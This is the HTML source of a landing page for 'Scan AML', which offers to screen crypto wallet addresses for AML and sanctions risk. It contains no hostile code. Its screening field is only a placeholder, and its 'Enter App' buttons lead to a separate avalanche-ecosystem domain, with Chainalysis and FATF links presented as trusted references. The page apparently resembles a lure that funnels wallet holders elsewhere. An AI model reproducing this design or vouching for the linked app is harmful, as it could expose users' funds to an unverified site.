<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Scan AML</title>
  <meta name="description" content="Scan AML scans a crypto wallet address for AML and sanctions risk before you transact.">
  <link rel="canonical" href="https://scan-aml.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F8F6">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Scan AML">
  <meta property="og:description" content="Scan AML scans a crypto wallet address for AML and sanctions risk before you transact.">
  <meta property="og:url" content="https://scan-aml.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Scan AML">
  <meta name="twitter:description" content="Scan AML scans a crypto wallet address for AML and sanctions risk before you transact.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://scan-aml.github.io/#website",
        "url": "https://scan-aml.github.io/",
        "name": "Scan AML",
        "inLanguage": "en"
      },
      {
        "@type": "WebApplication",
        "@id": "https://scan-aml.github.io/#app",
        "name": "Scan AML",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://scan-aml.github.io/",
        "offers": {
          "@type": "Offer",
          "price": "0",
          "priceCurrency": "USD"
        }
      },
      {
        "@type": "Organization",
        "@id": "https://scan-aml.github.io/#organization",
        "name": "Scan AML",
        "url": "https://scan-aml.github.io/"
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <a class="brand" href="#" aria-label="Scan AML">
      <img src="favicon.png" width="30" height="30" alt="">
      <span>Scan AML</span>
    </a>
    <nav class="nav" aria-label="Trusted references">
      <a href="https://www.chainalysis.com/solution/crypto-compliance/" target="_blank" rel="nofollow noopener noreferrer">Chainalysis</a>
      <a href="https://www.fatf-gafi.org/en/topics/virtual-assets.html" target="_blank" rel="nofollow noopener noreferrer">FATF virtual assets</a>
      <a href="https://www.investopedia.com/terms/m/moneylaundering.asp" target="_blank" rel="nofollow noopener noreferrer">AML overview</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-labelledby="page-title">
      <h1 id="page-title">Scan AML</h1>
      <p class="sub"><strong>Scan AML</strong> scans a crypto wallet address for AML and sanctions risk before you transact.</p>
    </section>

    <section class="screening-card" aria-label="Wallet screening preview">
      <div class="field-row">
        <label for="wallet-address">Wallet address</label>
        <div class="address-shell">
          <span class="asset-chip" aria-label="Ethereum">
            <img src="eth.png" width="22" height="22" alt="">
            ETH
          </span>
          <input id="wallet-address" value="0x&hellip; checked in app" readonly>
        </div>
      </div>
      <div class="status-row">
        <span>Risk &mdash; checked in app</span>
        <button class="hint-toggle" type="button" data-hint-toggle aria-expanded="false" aria-controls="hint-line">Details</button>
      </div>
      <p class="hint-line" id="hint-line" hidden>Open the app to review AML and sanctions signals for a specific address.</p>
      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
    </section>
  </main>

  <footer class="footer">Scan AML &mdash; 2026</footer>

  <script>
  (function(){
    "use strict";
    var button = document.querySelector("[data-hint-toggle]");
    var hint = document.getElementById("hint-line");
    if (!button || !hint) return;
    button.addEventListener("click", function(){
      var open = button.getAttribute("aria-expanded") === "true";
      button.setAttribute("aria-expanded", String(!open));
      hint.hidden = open;
    });
  })();
  </script>
</body>
</html>
